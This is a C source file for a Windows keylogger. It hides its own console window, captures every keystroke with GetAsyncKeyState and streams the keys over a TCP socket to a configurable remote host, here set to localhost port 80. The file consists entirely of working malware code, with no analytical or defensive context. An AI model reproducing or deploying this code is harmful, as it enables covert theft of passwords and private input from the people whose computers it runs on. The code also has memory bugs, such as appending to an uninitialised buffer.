#define WIN32_LEAN_AND_MEAN

//Needed to keylogging
#include <windows.h>
#include <winuser.h>

//Needed for networking
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 128
#define DEFAULT_PORT "80"
#define DEFAULT_HOST "127.0.0.1"

int Save (char key, int sock)
{
    if ( (key == 1) || (key == 2) )
        return 0;
    char output[100];
        switch(key){
                           case 8         : strcat(output,"[B]"); break; //Backspace
                           case VK_RETURN : strcat(output,"[E]"); break; //Enter
                           case VK_SPACE  : strcat(output,"[S]"); break; // Space
                           case VK_CLEAR  : strcat(output,"[C]"); break; //Clear
                           case VK_TAB    : strcat(output,"[T]");break; //Tab
                           case VK_SHIFT  : strcat(output,"[H]");break; // Shift
                           case VK_CONTROL: strcat(output,"[O]");break; // Control
                           case VK_ESCAPE : strcat(output,"[A]");break; // Escape
                           case VK_END    : strcat(output,"[N]");break; // End
                           case VK_HOME   : strcat(output,"[M]");break; // Home
                           case VK_LEFT   : strcat(output,"[L]");break; // Left
                           case VK_RIGHT  : strcat(output,"[R]");break; // Right
                           case VK_DOWN   : strcat(output,"[D]");break; // Down
                           case VK_UP     : strcat(output,"[U]");break; // Up
                           case 190       :
                           case 110       : strcat(output,"."); break; //Keypad . or keyboard .
                           default        : strcat(output,"[ ]"); output[3] = key;
                           }
    char *const allout = output;
    int result;
    result = send( sock,allout,5,0);
    int i;
    for(i=0;i<99;i++)
    {
        output[i]='\0';
    }
    return 0;
}

void Stealth()
{
  HWND Stealth;
  AllocConsole();
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth,0);
}

int __cdecl main() 
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char *sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        return 1;
    }
    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        WSACleanup();
        return 1;
    }
    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    Stealth();
    int i;
    while (true)
    {
        for(i=8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            Save (i,ConnectSocket);
        }
    }

    closesocket(ConnectSocket);
    while(true){}
return 0;
}

